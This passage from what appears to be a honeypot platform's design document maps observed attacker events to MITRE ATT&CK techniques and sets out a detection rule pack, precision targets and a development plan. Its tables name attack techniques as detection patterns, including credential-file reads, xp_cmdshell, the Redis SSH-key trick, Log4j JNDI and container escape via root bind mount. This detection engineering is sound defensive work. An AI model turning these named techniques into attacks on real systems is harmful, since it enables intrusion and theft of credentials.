| Keystroke fingerprint = automated      | TA0002  | T1059      | (none)         | M    |

#### Telnet (busybox telnetd)

Inherits the SSH shell-command catalogue. Adds:

| Event                                  | Tactic  | Technique  | Sub-technique | Conf |
|----------------------------------------|---------|------------|----------------|------|
| Mirai-style connect+exec sequence      | TA0001  | T1190      | (none)         | H    |
| Mirai-style connect+exec sequence      | TA0011  | T1105      | (none)         | H    |
| Default IoT creds (root/root)          | TA0006  | T1078      | T1078.001      | H    |
| Default IoT creds (admin/admin)        | TA0006  | T1078      | T1078.001      | H    |

#### RDP

| Event                                  | Tactic  | Technique  | Sub-technique | Conf |
|----------------------------------------|---------|------------|----------------|------|
| NLA auth attempt                       | TA0006  | T1110      | (none)         | M    |
| ≥5 fails / 5 min                       | TA0006  | T1110      | T1110.001      | H    |
| Successful auth                        | TA0001  | T1078      | (none)         | H    |
| Successful auth                        | TA0008  | T1021      | T1021.001      | H    |
| Screen-capture observed (probe)        | TA0009  | T1113      | (none)         | M    |

#### VNC

| Event                                  | Tactic  | Technique  | Sub-technique | Conf |
|----------------------------------------|---------|------------|----------------|------|
| RFB handshake from known scanner UA    | TA0043  | T1595      | T1595.001      | H    |
| Auth attempt                           | TA0006  | T1110      | (none)         | M    |
| Successful auth                        | TA0008  | T1021      | T1021.005      | H    |

### A.2 Databases

#### MySQL / Postgres / MSSQL

| Event                                  | Tactic  | Technique  | Sub-technique | Conf |
|----------------------------------------|---------|------------|----------------|------|
| Auth attempt fail / brute              | TA0006  | T1110      | (none)         | H    |
| `SELECT ... FROM mysql.user`           | TA0006  | T1003      | (none)         | H    |
| MSSQL `xp_cmdshell`                    | TA0002  | T1059      | (none)         | H    |
| MSSQL `xp_cmdshell`                    | TA0001  | T1190      | (none)         | H    |
| `LOAD DATA INFILE` (MySQL)             | TA0009  | T1213      | (none)         | H    |
| `COPY FROM` (Postgres)                 | TA0009  | T1213      | (none)         | H    |
| `INTO OUTFILE` (MySQL)                 | TA0010  | T1567      | (none)         | H    |
| `COPY TO` (Postgres)                   | TA0010  | T1567      | (none)         | H    |
| `pg_read_server_files`                 | TA0007  | T1083      | (none)         | H    |
| `pg_ls_dir`                            | TA0007  | T1083      | (none)         | H    |
| `DROP DATABASE` mass                   | TA0040  | T1485      | (none)         | H    |
| `TRUNCATE` mass                        | TA0040  | T1485      | (none)         | H    |

#### MongoDB

| Event                                  | Tactic  | Technique  | Sub-technique | Conf |
|----------------------------------------|---------|------------|----------------|------|
| Unauth `listDatabases`                 | TA0007  | T1082      | (none)         | H    |
| `db.dropDatabase()` mass               | TA0040  | T1485      | (none)         | H    |
| Ransom note insert pattern             | TA0040  | T1486      | (none)         | H    |

#### Redis

| Event                                  | Tactic  | Technique  | Sub-technique | Conf |
|----------------------------------------|---------|------------|----------------|------|
| `CONFIG SET dir` + `SET` SSH-key trick | TA0003  | T1098      | T1098.004      | H    |
| `MODULE LOAD`                          | TA0002  | T1059      | (none)         | H    |
| `FLUSHALL`                             | TA0040  | T1485      | (none)         | H    |
| Unauth `INFO` from scanner             | TA0043  | T1595      | T1595.002      | M    |

#### Elasticsearch

| Event                                  | Tactic  | Technique  | Sub-technique | Conf |
|----------------------------------------|---------|------------|----------------|------|
| `_cluster/health` from scanner UA      | TA0043  | T1595      | T1595.002      | M    |
| `DELETE /_all`                         | TA0040  | T1485      | (none)         | H    |
| Mass `GET /<index>/_search`            | TA0009  | T1213      | (none)         | H    |

### A.3 Web & APIs

#### HTTP (templated apps)

| Event                                  | Tactic  | Technique  | Sub-technique | Conf |
|----------------------------------------|---------|------------|----------------|------|
| User-Agent matches sqlmap/nikto/etc    | TA0043  | T1595      | T1595.002      | H    |
| `/wp-login.php` brute                  | TA0006  | T1110      | (none)         | H    |
| `/.env` request                        | TA0007  | T1083      | (none)         | H    |
| `/.env` request                        | TA0006  | T1552      | T1552.001      | H    |
| `/.git/config` request                 | TA0007  | T1083      | (none)         | H    |
| `/.git/config` request                 | TA0006  | T1552      | T1552.001      | H    |
| Path traversal (`../`)                 | TA0001  | T1190      | (none)         | H    |
| `.php` POST (shell upload)             | TA0001  | T1190      | (none)         | H    |
| `.php` POST (shell upload)             | TA0003  | T1505      | T1505.003      | H    |
| `.jsp` POST (shell upload)             | TA0001  | T1190      | (none)         | H    |
| `.jsp` POST (shell upload)             | TA0003  | T1505      | T1505.003      | H    |
| Log4j JNDI in headers                  | TA0001  | T1190      | (none)         | H    |
| Webshell access pattern                | TA0011  | T1059      | (none)         | H    |

#### Docker API

| Event                                  | Tactic  | Technique  | Sub-technique | Conf |
|----------------------------------------|---------|------------|----------------|------|
| `GET /version` from scanner            | TA0043  | T1595      | T1595.002      | M    |
| `POST /containers/create` w/ priv      | TA0004  | T1611      | (none)         | H    |
| Bind mount of `/`                      | TA0004  | T1611      | (none)         | H    |

#### Kubernetes

| Event                                  | Tactic  | Technique  | Sub-technique | Conf |
|----------------------------------------|---------|------------|----------------|------|
| `/api/v1/namespaces/.../secrets`       | TA0006  | T1552      | T1552.007      | H    |
| `kubectl exec` mock                    | TA0002  | T1610      | (none)         | H    |
| `serviceaccount` token harvest         | TA0006  | T1528      | (none)         | H    |

#### LLMNR

| Event                                  | Tactic  | Technique  | Sub-technique | Conf |
|----------------------------------------|---------|------------|----------------|------|
| Responder-style query/response         | TA0009  | T1557      | T1557.001      | H    |

### A.4 File transfer & storage

#### SMB

| Event                                  | Tactic  | Technique  | Sub-technique | Conf |
|----------------------------------------|---------|------------|----------------|------|
| Null session enumeration               | TA0007  | T1135      | (none)         | H    |
| Share listing                          | TA0007  | T1135      | (none)         | H    |
| File read                              | TA0009  | T1039      | (none)         | H    |
| File write (foothold)                  | TA0008  | T1021      | T1021.002      | H    |
| Pass-the-hash signature                | TA0006  | T1550      | T1550.002      | H    |

#### FTP

| Event                                  | Tactic  | Technique  | Sub-technique | Conf |
|----------------------------------------|---------|------------|----------------|------|
| Anonymous login attempt                | TA0006  | T1078      | T1078.001      | M    |
| Brute attempt                          | TA0006  | T1110      | (none)         | H    |
| `STOR` of executable                   | TA0011  | T1105      | (none)         | H    |
| Mass `RETR`                            | TA0009  | T1039      | (none)         | M    |

#### TFTP

| Event                                  | Tactic  | Technique  | Sub-technique | Conf |
|----------------------------------------|---------|------------|----------------|------|
| `RRQ` of router config (`*-confg`)     | TA0009  | T1602      | T1602.002      | H    |
| `WRQ` upload                           | TA0011  | T1105      | (none)         | H    |

### A.5 Directory & non-mail (LDAP)

#### LDAP

| Event                                  | Tactic  | Technique  | Sub-technique | Conf |
|----------------------------------------|---------|------------|----------------|------|
| Anonymous bind + search                | TA0007  | T1087      | T1087.002      | H    |
| BloodHound query signature             | TA0007  | T1087      | T1087.002      | H    |
| BloodHound query signature             | TA0007  | T1482      | (none)         | H    |
| Bind brute                             | TA0006  | T1110      | (none)         | H    |

### A.6 Mail (SMTP relay + non-relay, IMAP, POP3)

The largest single section. Every SMTP message is captured in
full (headers + body + attachments) by both the relay and
non-relay services; the email lifter consumes them. IMAP/POP3
provide additional auth-and-fetch patterns.

#### SMTP — connection & command-level

| Event                                  | Tactic  | Technique  | Sub-technique | Conf |
|----------------------------------------|---------|------------|----------------|------|
| Auth brute (`AUTH PLAIN/LOGIN`)        | TA0006  | T1110      | (none)         | H    |
| `VRFY` enumeration                     | TA0007  | T1087      | (none)         | H    |
| `EXPN` enumeration                     | TA0007  | T1087      | (none)         | H    |
| Open relay test (foreign From + RCPT)  | TA0043  | T1595      | (none)         | H    |
| `STARTTLS` downgrade attempt           | TA0005  | T1562      | T1562.010      | M    |
| `EHLO` hostname matches scanner        | TA0043  | T1595      | T1595.002      | M    |

#### SMTP — message-level (whole message; `source_kind = "email"`)

| Event                                  | Tactic  | Technique  | Sub-technique | Conf |
|----------------------------------------|---------|------------|----------------|------|
| RCPT count ≥ N (mass relay)            | TA0040  | T1496      | (none)         | H    |
| RCPT count ≥ N + foreign From          | TA0042  | T1586      | T1586.002      | H    |
| RCPT count ≥ N + matching body across N | TA0001  | T1566      | (none)         | H    |
| Same body fingerprint, multiple Identities | TA0042 | T1583   | T1583.006      | H    |
| Successful AUTH then large send burst  | TA0042  | T1586      | T1586.002      | H    |

#### SMTP — header-level (`source_kind = "email_header"`)

| Event                                  | Tactic  | Technique  | Sub-technique | Conf |
|----------------------------------------|---------|------------|----------------|------|
| `From:` ≠ `Return-Path:` domain        | TA0005  | T1036      | (none)         | H    |
| `From:` ≠ `MAIL FROM:` domain          | TA0005  | T1036      | (none)         | H    |
| Missing `DKIM-Signature:`              | TA0005  | T1036      | (none)         | M    |
| `Authentication-Results:` SPF=fail     | TA0005  | T1036      | (none)         | M    |
| Multiple `Received:` from scanner ASNs | TA0011  | T1090      | (none)         | M    |
| `X-Mailer:` matches phishing kit DB    | TA0001  | T1566      | (none)         | H    |
| `X-Mailer:` matches phishing kit DB    | TA0042  | T1588      | T1588.001      | H    |
| Forged `Date:` header (skewed)         | TA0005  | T1070      | T1070.006      | M    |
| `Reply-To:` differs from `From:` domain| TA0005  | T1036      | (none)         | M    |
| Brand-impersonating display name       | TA0005  | T1036      | T1036.005      | H    |

#### SMTP — body-level (`source_kind = "email_body"`)

| Event                                  | Tactic  | Technique  | Sub-technique | Conf |
|----------------------------------------|---------|------------|----------------|------|
| Credential-harvest landing-page link   | TA0001  | T1566      | T1566.002      | H    |
| Credential-harvest landing-page link   | TA0009  | T1056      | T1056.003      | H    |
| IDN/punycode URL (`xn--…`)             | TA0005  | T1036      | T1036.005      | H    |
| IDN/punycode URL (`xn--…`)             | TA0001  | T1566      | T1566.002      | H    |
| Brand impersonation in subject + body  | TA0001  | T1566      | T1566.002      | H    |
| BEC pattern (urgent wire / CEO)        | TA0001  | T1566      | T1566.003      | H    |
| Sextortion template + BTC address      | TA0001  | T1566      | (none)         | H    |
| Sextortion template + BTC address      | TA0040  | T1657      | (none)         | M    |
| Encoded payload (base64 ≥ N bytes)     | TA0011  | T1071      | T1071.003      | H    |
| Encoded payload (base64 ≥ N bytes)     | TA0005  | T1027      | (none)         | H    |
| Tracking-pixel beacon URL              | TA0007  | T1592      | (none)         | M    |

#### SMTP — attachment-level (`source_kind = "email_attachment"`)

| Event                                  | Tactic  | Technique  | Sub-technique | Conf |
|----------------------------------------|---------|------------|----------------|------|
| Office macro (OLE / VBA detected)      | TA0002  | T1204      | T1204.002      | H    |
| Office macro (OLE / VBA detected)      | TA0001  | T1566      | T1566.001      | H    |
| Password-protected ZIP/RAR/7z          | TA0005  | T1027      | (none)         | H    |
| Password-protected ZIP/RAR/7z          | TA0001  | T1566      | T1566.001      | H    |
| HTML smuggling pattern                 | TA0005  | T1027      | T1027.006      | H    |
| `.lnk` / `.iso` / `.img` payload       | TA0002  | T1204      | T1204.002      | H    |
| Hash matches MalwareBazaar             | TA0002  | T1204      | T1204.002      | H    |
| Hash matches MalwareBazaar             | TA0042  | T1588      | T1588.001      | H    |
| Executable masqueraded by extension    | TA0005  | T1036      | T1036.008      | H    |

#### IMAP / POP3

| Event                                  | Tactic  | Technique  | Sub-technique | Conf |
|----------------------------------------|---------|------------|----------------|------|
| Auth brute                             | TA0006  | T1110      | (none)         | H    |
| Successful auth + bulk `FETCH`         | TA0009  | T1114      | T1114.002      | H    |

### A.7 ICS / IoT

#### MQTT

| Event                                  | Tactic        | Technique  | Sub-technique | Conf |
|----------------------------------------|---------------|------------|----------------|------|
| Wildcard SUBSCRIBE (`#`)               | TA0100 (ICS)  | T0801      | (none)         | H    |
| Auth brute                             | TA0006        | T1110      | (none)         | H    |

#### SNMP

| Event                                  | Tactic  | Technique  | Sub-technique | Conf |
|----------------------------------------|---------|------------|----------------|------|
| Default community string (`public`)    | TA0007  | T1046      | (none)         | H    |
| Default community string (`public`)    | TA0006  | T1078      | T1078.001      | H    |
| `walk` of full MIB                     | TA0007  | T1046      | (none)         | H    |

#### SIP

| Event                                  | Tactic  | Technique  | Sub-technique | Conf |
|----------------------------------------|---------|------------|----------------|------|
| `OPTIONS` scan                         | TA0043  | T1595      | (none)         | H    |
| `REGISTER` brute                       | TA0006  | T1110      | (none)         | H    |

#### Conpot (Modbus / S7 / etc)

| Event                                  | Tactic        | Technique  | Sub-technique | Conf |
|----------------------------------------|---------------|------------|----------------|------|
| Modbus function-code scan              | TA0102 (ICS)  | T0846      | (none)         | H    |
| Coil/register write                    | TA0106 (ICS)  | T0831      | (none)         | H    |

### A.8 Cross-cutting

#### Fingerprints (sniffer-side, network-level)

| Event                                  | Tactic  | Technique  | Sub-technique | Conf |
|----------------------------------------|---------|------------|----------------|------|
| JARM matches known C2 framework        | TA0011  | T1071      | T1071.001      | H    |
| HASSH matches known offensive tooling  | TA0002  | T1059      | (none)         | H    |
| JA3 matches known scanner              | TA0043  | T1595      | T1595.002      | M    |

#### Canaries

| Event                                  | Tactic  | Technique  | Sub-technique | Conf |
|----------------------------------------|---------|------------|----------------|------|
| AWS-key canary triggered               | TA0006  | T1552      | T1552.001      | H    |
| Honeydoc canary triggered              | TA0009  | T1005      | (none)         | H    |

#### Payloads

| Event                                  | Tactic  | Technique  | Sub-technique | Conf |
|----------------------------------------|---------|------------|----------------|------|
| ELF/PE upload                          | TA0011  | T1105      | (none)         | H    |
| Hash matches MalwareBazaar             | TA0002  | T1059      | (none)         | H    |
| Shellcode signature                    | TA0002  | T1055      | (none)         | H    |

#### Identity-rollup-only (cross-Attacker; no single source row)

| Event                                  | Tactic  | Technique  | Sub-technique | Conf |
|----------------------------------------|---------|------------|----------------|------|
| Same creds, ≥3 IPs same Identity       | TA0006  | T1110      | T1110.003      | H    |
| Same creds, ≥3 services same Identity  | TA0006  | T1110      | T1110.004      | H    |
| ≥3 ASNs in <24h, same Identity         | TA0042  | T1583      | T1583.003      | M    |
| Same body fingerprint, ≥2 Identities   | TA0042  | T1583      | T1583.006      | H    |

### A.9 Canary fingerprint (browser payload derivations)

The canary fingerprint payload (`decnet/canary/fingerprint_payload.js`)
runs inside an opened HTML/SVG canary and harvests browser
primitives — navigator/screen/timezone/connection, canvas + WebGL +
audio + font fingerprints, WebRTC IP leak, perf timing jitter,
permissions, plus a composite identity hash.

**Boundary discipline (see also "Enrichment vs tag boundary" in
Hard parts §7):** the bulk fingerprint blob enriches
`Attacker.fingerprints` and feeds the clusterer; **only specific
behavioral derivations** below produce `ttp_tag` rows.

Two source kinds:

- `canary` — the trigger event itself (the `/c/<slug>` fetch). Same
  rows as before.
- `canary_fingerprint` — derivations from the fingerprint payload.

#### canary trigger (`source_kind = "canary"`)

| Event                                  | Tactic  | Technique  | Sub-technique | Conf |
|----------------------------------------|---------|------------|----------------|------|
| AWS-key canary triggered               | TA0006  | T1552      | T1552.001      | H    |
| Honeydoc canary triggered              | TA0009  | T1005      | (none)         | H    |
| Any canary triggered (generic)         | TA0009  | T1005      | (none)         | M    |

#### Browser automation signals (`source_kind = "canary_fingerprint"`)

| Event                                              | Tactic  | Technique | Sub-technique | Conf |
|----------------------------------------------------|---------|-----------|----------------|------|
| `navigator.webdriver === true`                     | TA0002  | T1059     | (none)         | H    |
| Canvas/audio hash matches Puppeteer signature      | TA0002  | T1059     | (none)         | H    |
| Canvas/audio hash matches Puppeteer signature      | TA0042  | T1588     | T1588.002      | H    |
| Canvas/audio hash matches Playwright signature     | TA0002  | T1059     | (none)         | H    |
| Canvas/audio hash matches Playwright signature     | TA0042  | T1588     | T1588.002      | H    |
| Canvas/audio hash matches Selenium signature       | TA0002  | T1059     | (none)         | H    |
| WebGL unmasked renderer = SwiftShader (headless)   | TA0002  | T1059     | (none)         | H    |
| WebGL unmasked renderer = llvmpipe (headless)      | TA0002  | T1059     | (none)         | H    |
| Perf timing jitter signature consistent with VM    | TA0042  | T1583     | T1583.001      | M    |

#### Proxy / VPN / opsec leakage (`source_kind = "canary_fingerprint"`)

| Event                                              | Tactic  | Technique | Sub-technique | Conf |
|----------------------------------------------------|---------|-----------|----------------|------|
| WebRTC private IP doesn't match source-IP geo      | TA0011  | T1090     | (none)         | H    |
| WebRTC reveals known Tor exit / VPN endpoint       | TA0011  | T1090     | T1090.003      | H    |
| `Intl` timezone vs source-IP geo mismatch (>3 zones) | TA0011 | T1090   | (none)         | M    |
| `navigator.language(s)` vs source-IP country mismatch | TA0011 | T1090  | (none)         | M    |
| Tor Browser canvas/font signature                  | TA0011  | T1090     | T1090.003      | M    |
| Brave-shields / anti-fingerprint browser pattern   | TA0005  | T1027     | (none)         | M    |

#### Masquerading / inconsistency (`source_kind = "canary_fingerprint"`)

| Event                                              | Tactic  | Technique | Sub-technique | Conf |
|----------------------------------------------------|---------|-----------|----------------|------|
| `navigator.platform` inconsistent with `userAgent` | TA0005  | T1036     | (none)         | H    |
| `userAgent` claims mobile, screen says desktop     | TA0005  | T1036     | (none)         | M    |
| `userAgent` family vs WebGL renderer mismatch      | TA0005  | T1036     | (none)         | M    |

**Identity-merge guard rail.** The composite `fp.id` hash matching
across IPs/Identities is an **identity-merge signal, NOT a TTP** —
same argument as keystroke `kd_digraph_simhash` (Appendix D §D.3).
The lifter does not emit a TTP from a bare composite-hash match.
That signal goes upstream into the clusterer.

### A.10 Intel verdicts (third-party providers)

`source_kind = "intel_verdict"` for everything in this section.
Source row is the `AttackerIntel` row matched by `attacker_uuid`.
All tags here are **opportunistic** — they only fire when the
enrich worker has populated the relevant per-provider column. A
fresh attacker with no intel row yet produces zero tags from this
engine, and the dashboard renders normally with whatever the other
engines produced.

#### AbuseIPDB categories

AbuseIPDB returns up to two categories per report plus an aggregate
abuse-confidence score (0–100). Per-category mapping:

| AbuseIPDB category                          | Tactic | Technique | Sub-tech | Conf  |
|----------------------------------------------|--------|-----------|----------|-------|
| 14 — Port Scan                               | TA0007 | T1046     | (none)   | H     |
| 14 — Port Scan                               | TA0043 | T1595     | T1595.001| H     |
| 15 — Hacking                                 | TA0001 | T1190     | (none)   | M     |
| 18 — Brute-Force                             | TA0006 | T1110     | (none)   | H     |
| 18 + service=SSH                             | TA0006 | T1110     | T1110.001| H     |
| 19 — Bad Web Bot                             | TA0043 | T1595     | T1595.002| M     |
| 20 — Exploited Host                          | TA0001 | T1078     | (none)   | M     |
| 21 — Web App Attack                          | TA0001 | T1190     | (none)   | H     |
| 22 — SSH                                     | TA0006 | T1110     | (none)   | M     |
| 23 — IoT Targeted                            | TA0001 | T1190     | (none)   | M     |
| 11 — Email Spam                              | TA0040 | T1496     | (none)   | M     |
| 11 — Email Spam (high score, ≥80)            | TA0001 | T1566     | (none)   | M     |
| 10 — DDoS                                    | TA0040 | T1498     | (none)   | L     |
| 5 — FTP Brute-Force                          | TA0006 | T1110     | (none)   | H     |
| 17 — VPN IP                                  | TA0011 | T1090     | (none)   | M     |
| 9 — Open Proxy                               | TA0011 | T1090     | (none)   | M     |
| 4 — DDoS (untyped)                           | (drop — too muddy for v0)             |       |

Final tag confidence = listed band × `abuseipdb_score / 100`.

#### GreyNoise classification + tags

| GreyNoise signal                            | Tactic | Technique | Sub-tech  | Conf  |
|----------------------------------------------|--------|-----------|-----------|-------|
| classification = "malicious"                 | (no tag alone — needs tag) |        |
| classification = "benign"                    | (no tag — confidence-decrement existing tags) |
| classification = "scanner"                   | TA0043 | T1595     | T1595.002 | H     |
| tag matches "tor_exit_node"                  | TA0011 | T1090     | T1090.003 | H     |
| tag matches known C2 family (e.g. "cobalt_strike", "metasploit") | TA0011 | T1071 | T1071.001 | H |
| tag matches known C2 family                  | TA0042 | T1588     | T1588.001 | H     |
| tag matches "ssh_bruteforcer"                | TA0006 | T1110     | T1110.001 | H     |
| tag matches "web_crawler" (non-Google)       | TA0043 | T1595     | T1595.002 | M     |

Final confidence = listed band × 1.0 (GreyNoise has no per-verdict
score; classification is binary). Apply the "benign" decrement
*only* to confidence-bumpable existing tags, never to identity-
rollup or behavioral-lifter tags (those have independent
substantiation).

#### abuse.ch Feodo Tracker

| Feodo signal                                | Tactic | Technique | Sub-tech  | Conf  |
|----------------------------------------------|--------|-----------|-----------|-------|
| `feodo_listed = True`                        | TA0011 | T1071     | T1071.001 | H     |
| `feodo_listed = True`                        | TA0042 | T1588     | T1588.001 | H     |
| `feodo_raw.malware` ∈ {Emotet, Dridex, QakBot, TrickBot, Heodo, …} → family attribution carried in `evidence.malware_family` | (above tags) | (above) | (above) | H |

Family attribution lands in the tag `evidence` JSON. It does not
spawn additional technique tags by itself — that path is reserved
for ThreatFox where the IOC type genuinely varies.

#### abuse.ch ThreatFox

ThreatFox returns IOC type + malware family. Per-IOC-type mapping:

| ThreatFox IOC type                          | Tactic | Technique | Sub-tech  | Conf  |
|----------------------------------------------|--------|-----------|-----------|-------|
| `botnet_cc`                                  | TA0011 | T1071     | T1071.001 | H     |
| `botnet_cc`                                  | TA0042 | T1588     | T1588.001 | H     |
| `payload_delivery`                           | TA0011 | T1105     | (none)    | H     |
| `payload_delivery`                           | TA0042 | T1588     | T1588.001 | H     |
| `c2_server`                                  | TA0011 | T1071     | T1071.001 | H     |
| `download_url`                               | TA0011 | T1105     | (none)    | H     |

Family name (e.g. "cobalt_strike", "sliver", "havoc",
"asyncrat") is carried in `evidence.malware_family` for downstream
attribution. ThreatFox-derived tags carry the highest base
confidence in v0 (0.95) — the IOC database is curated.

---

## Appendix B — Initial rule pack (v0)

Target: 40–55 rule files. A single rule may emit multiple
techniques (see worked example). Picked by "what does our existing
dataset already see most often, and what would an analyst most
want to filter on?":

### Shell / command (R0001–R0030)

1. `R0001` — generic auth brute (any service) → T1110
2. `R0002` — password guessing per-account → T1110.001
3. `R0003` — password spraying cross-account (identity-rollup) → T1110.003
4. `R0004` — credential stuffing (CredentialReuse-driven) → T1110.004
5. `R0005` — valid account use post-success → T1078
6. `R0006` — default credentials → T1078.001
7. `R0007` — sqlmap UA → T1190 + T1595.002
8. `R0008` — Log4j JNDI → T1190
9. `R0009` — path traversal → T1190
10. `R0010` — Unix shell exec → T1059.004
11. `R0011` — generic command/scripting → T1059
12. `R0012` — ingress tool transfer → T1105
13. `R0013` — `/etc/passwd` read → T1083
14. `R0014` — `/etc/shadow` read → T1003.008
15. `R0015` — SUID search → T1083 + T1548.001
16. `R0016` — recursive find → T1083
17. `R0017` — network service scan → T1046 + T1595
18. `R0018` — system info discovery → T1082
19. `R0019` — user discovery → T1033
20. `R0020` — network config discovery → T1016
21. `R0021` — network connections discovery → T1049
22. `R0022` — LDAP account discovery → T1087.002 + T1482
23. `R0023` — SMB share discovery → T1135
24. `R0024` — local account creation → T1136.001
25. `R0025` — cron persistence → T1053.003
26. `R0026` — Redis SSH-key persistence → T1098.004
27. `R0027` — webshell installation → T1505.003
28. `R0028` — clear command history → T1070.003
29. `R0029` — sudo abuse → T1548.003
30. `R0030` — JARM/HASSH C2 fingerprint → T1071 + T1071.001

### Behavioral / cross-event (R0031–R0040)

31. `R0031` — beaconing behavioral → T1071 + T1029
32. `R0032` — data destruction (FLUSHALL/DROP/DELETE _all) → T1485
33. `R0033` — ransom note pattern → T1486
34. `R0034` — exfil over web → T1567
35. `R0035` — DB mass-read → T1213
36. `R0036` — credentials in files (env/git/canary) → T1552.001
37. `R0037` — k8s service account tokens → T1552.007
38. `R0038` — Docker host escape → T1611
39. `R0039` — LLMNR poisoning → T1557.001
40. `R0040` — TFTP router config retrieval → T1602.002

### Email / SMTP (R0041–R0048)

41. `R0041` — open-relay abuse (high-RCPT, foreign From) → T1496 + T1586.002
42. `R0042` — mass phishing campaign (RCPT count + body match) → T1566
43. `R0043` — phishing kit X-Mailer signature → T1566 + T1588.001
44. `R0044` — IDN/homoglyph URL in body → T1036.005 + T1566.002
45. `R0045` — sender masquerade (From/Return-Path mismatch, DKIM) → T1036
46. `R0046` — malicious attachment (macro/LNK/ISO/maldoc) → T1204.002 + T1566.001
47. `R0047` — BEC pattern (urgent wire / CEO impersonation) → T1566.003
48. `R0048` — encoded payload in body (base64 over threshold) → T1071.003 + T1027

### Canary fingerprint (R0049–R0053)

49. `R0049` — `navigator.webdriver` automation flag → T1059
50. `R0050` — canvas/audio hash matches known automation tool (Puppeteer/Playwright/Selenium) → T1059 + T1588.002
51. `R0051` — WebRTC IP leak: private IP doesn't match source-IP geo → T1090
52. `R0052` — TZ / language vs source-IP geo mismatch → T1090
53. `R0053` — `navigator.platform` / userAgent / WebGL renderer inconsistency → T1036

### Intel verdicts (R0054–R0058)

Each rule reads a specific provider column and emits per the
mapping tables in Appendix A.10. **All five tolerate absence
silently** — a null column is "no tag from this rule", never an
error.

54. `R0054` — AbuseIPDB category → ATT&CK technique (per A.10 table)
55. `R0055` — GreyNoise classification + tag → ATT&CK technique (per A.10 table)
56. `R0056` — Feodo Tracker hit → T1071.001 + T1588.001 with family attribution
57. `R0057` — ThreatFox IOC type → ATT&CK technique with family attribution
58. `R0058` — Aggregate verdict = "malicious" with no specific provider mapping → confidence-bump existing tags only (no new tag emission)

### Reserved (R0059–R0065)

ICS-specific (Modbus/S7), additional aggregate / session-end rules,
plus any precision-target failures from the v0 cohort that need
splitting. Rule slots reserved so IDs stay stable.

## Appendix C — Rule precision targets

Per rule, before merge:

- **High-confidence rules (≥0.85):** must achieve ≥95% precision
  on a manually-labelled holdout of 100 random matches from the
  existing attacker corpus. Tests live in
  `tests/ttp/rule_precision/`.
- **Medium-confidence rules (0.6–0.85):** ≥80% precision on 100
  matches.
- **Low-confidence rules (<0.6):** not shipped in v0. Hidden by
  default if added later.

Recall is intentionally not a v1 target. We would rather miss a
technique than mislabel one — false positives flow to the SIEM and
poison downstream automation.

---

## Appendix D — Anticipated biometric lifters (deferred)

This appendix exists so that when keystroke biometrics ingestion
ships (`SessionProfile` columns become populated) and any further
biometric FK lands on `AttackerIdentity`, the integration point
into the TTP layer is already specified. Nothing in this appendix
ships in the v0 worker.

**Architectural commitment:** biometric features live on
`SessionProfile` and on `AttackerIdentity` (FK from there to
whatever biometric profile table emerges). The TTP worker reads
them via the existing `session_id` / `identity_uuid` joins on
`ttp_tag`. **No biometric-specific columns are added to `ttp_tag`.**

### D.1 Source kinds (reserved)

- `keystroke_session` — per-session keystroke-derived signal,
  `source_id` = `SessionProfile.sid`.
- `biometric_match` — cross-session keystroke similarity signal,
  `source_id` = synthetic match-event UUID assembled by the lifter.

### D.2 Anticipated rules (illustrative, not pre-shipped)

| Source signal                                                | Tactic  | Technique | Sub-technique | Confidence |
|--------------------------------------------------------------|---------|-----------|---------------|------------|
| `kd_iki_mean` < threshold AND `kd_burst_ratio` > threshold   | TA0002  | T1059     | (none)        | 0.85       |
| `kd_start_of_action_latency` ≈ 0                              | TA0002  | T1059     | (none)        | 0.80       |
| `kd_pause_hist_distracted` heavy (human signal)               | (adjustment) — confidence-decrement on automation tags |
| HASSH match + matching cross-session simhash cohort           | TA0011  | T1071     | T1071.001     | 0.95 (bumped) |
| Bot-signal cluster + successful auth                          | TA0006  | T1110     | (none)        | 0.95 (bumped) |

### D.3 Explicit non-rule: identity merging is NOT a TTP

Cross-session `kd_digraph_simhash` matches are **identity-merge
signals**, not TTP signals. They belong upstream in the clusterer
(same typist across IPs → merge identities). Tagging them as TTPs
would be a category error and would pollute the technique
heatmap with non-behavioral inferences.

The lifter will deliberately NOT emit a TTP from the bare simhash
match. It only emits TTPs when the cohort match is composed with a
behavioral primitive (e.g., "matching simhash cohort + tooling
fingerprint match → tooling-attribution-grade T1071.001 with
elevated confidence").

### D.4 Migration footprint when biometrics ships

- `ttp_tag`: zero changes. New `source_kind` values appear in
  production data; existing rows are unaffected.
- `decnet/ttp/impl/biometric_lifter.py`: new file, new lifter
  registered with the worker.
- New rule pack entries in `rules/biometric_*.yaml`.
- API: no new endpoints; existing `/by-identity` / `/by-session`
  surfaces serve the new tags transparently.
- UI: no schema-driven changes; existing TTP heatmap renders the
  new techniques like any other.

This is the forward-compat win: the *infrastructure* absorbs the
new feature; only the *content* changes.

---

## Appendix E — CDD plan (Contract-Driven Development)

This appendix lays out the order of work in CDD discipline:
**contracts first, tests second, implementation last.** Nothing
in this section is implementation; it specifies what to create
and in what order.

The project's "commit per task with tests in the same commit"
convention applies to the implementation phase. The contracts and
test phases are themselves split into commit-sized steps.

### E.1 Contracts

The contracts define *shapes* and *signatures* with no behavior.
Empty function bodies (`raise NotImplementedError`), empty API
endpoint handlers (returning `[]` typed correctly), empty Tagger
subclasses. The codebase compiles, mypy passes, the worker
registers, the API routes resolve — but nothing produces tags yet.

Contracts ship in this order, one commit per step:

**E.1.1 — Schema contract** (`decnet/web/db/models/ttp.py`)

**Status:** ✅ done.

- `TTPTag` SQLModel with the schema from "Schema" section above,
  including: `evidence` as `dict[str, Any]` over a SQLAlchemy JSON
  column (`Column(JSON, nullable=False)`); `attack_release` as
  an indexed `str` column; `__table_args__` carrying the
  `CheckConstraint("attacker_uuid IS NOT NULL OR identity_uuid IS
  NOT NULL", name="ttp_tag_has_anchor")`; and an `__init__` guard
  that raises `ValueError` when both anchors are NULL (belt-and-
  braces for MySQL <8.0.16 where CHECK is silently ignored).
- Per-`source_kind` `TypedDict` definitions (`CommandEvidence`,
  `IntelEvidence`, `EmailEvidence`, `CanaryFingerprintEvidence`,
  …) declared in the same file alongside `TTPTag` per the "all
  models in one place" project rule. Adding a new `source_kind`
  requires adding a `TypedDict` here AND a shape entry in
  `tests/ttp/test_evidence_shape.py`.
- `compute_tag_uuid(source_kind, source_id, rule_id, rule_version,
  technique_id, sub_technique_id) -> str` — deterministic
  **UUIDv5** under the fixed namespace
  `uuid.UUID("decnet:ttp_tag:v1")` (concretely:
  `uuid.uuid5(_TTP_TAG_NS, "|".join(...))`). Stable across
  processes and Python versions; produces a real RFC-4122 UUID
  string, not a truncated SHA-256. Empty function body permitted;
  the test phase pins the algorithm and the namespace constant.
- Re-export from `decnet/web/db/models/__init__.py`.

